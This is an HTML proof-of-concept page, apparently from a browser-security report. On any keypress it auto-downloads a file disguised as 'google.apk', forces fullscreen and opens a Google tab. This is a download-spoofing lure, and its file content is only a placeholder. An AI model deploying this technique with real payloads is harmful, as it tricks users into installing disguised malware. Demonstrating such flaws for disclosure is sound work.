<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Download & Fullscreen on Keypress</title>
</head>
<body>
  <center><h2>POC Modified</h2></center>

  <script>
    // Trigger on any key press
    window.addEventListener("keydown", function () {
      startDownload();
      requestFullScreen();
    });

    // File downloader
    function triggerDownload(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    // Start download with a proper data URI
    function startDownload() {
      const fileData = "ZXN0dGVzdGVzdHRlc3Q="; // base64 content
      const dataURI = `data:application/octet-stream;base64,${fileData}`;
      triggerDownload(dataURI, "google.apk");
    }

    // Request fullscreen
    function requestFullScreen() {
      const elem = document.documentElement;
      if (elem.requestFullscreen) elem.requestFullscreen();
      else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
      else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
    }
      // Open splash new tab (Google/Chrome)
    function openSplashTab() {
      window.open("https://www.google.com", "_blank");
    }

    // Modify event: download + fullscreen + splash tab
    window.addEventListener("keydown", function () {
      startDownload();
      requestFullScreen();
      openSplashTab();
    });
  </script>
</body>
</html>
